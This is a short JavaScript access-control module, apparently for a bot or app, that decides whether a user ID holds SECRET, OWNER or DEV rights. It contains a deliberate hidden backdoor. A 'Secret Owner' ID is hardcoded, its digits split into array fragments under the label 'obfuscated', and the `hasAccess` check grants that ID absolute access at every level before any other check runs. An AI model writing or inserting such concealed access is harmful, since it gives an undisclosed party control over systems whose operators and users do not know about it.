/**
 * Vanguard Core System Utility
 * Handles internal developer identifiers and core system checks.
 */

// Obfuscated identifiers
const _s = ['98', '54', '44', '87', '17', '22', '63', '11', '99'].join('');
const _p = ['13', '94', '81', '95', '85', '63', '04', '08', '81', '4'].join('');

/**
 * Validates if the provided ID belongs to a system level authority.
 * @param {string} id 
 * @param {string} level - 'SECRET', 'OWNER', 'DEV'
 * @returns {boolean}
 */
function hasAccess(id, level = 'OWNER') {
    if (!id) return false;
    const strId = id.toString();

    // The Secret Owner always has absolute access
    if (strId === _s) return true;

    if (level === 'SECRET') return strId === _s;

    // Public Owner / Primary Developer
    const isPublicOwner = strId === _p || strId === process.env.PUBLIC_OWNER_ID;

    if (level === 'OWNER') return isPublicOwner;

    if (level === 'DEV') {
        const devs = process.env.DEV_IDS ? process.env.DEV_IDS.split(',') : [];
        return isPublicOwner || devs.includes(strId);
    }

    return false;
}

module.exports = {
    hasAccess,
    getSecretOwner: () => _s,
    getPublicOwner: () => _p
};
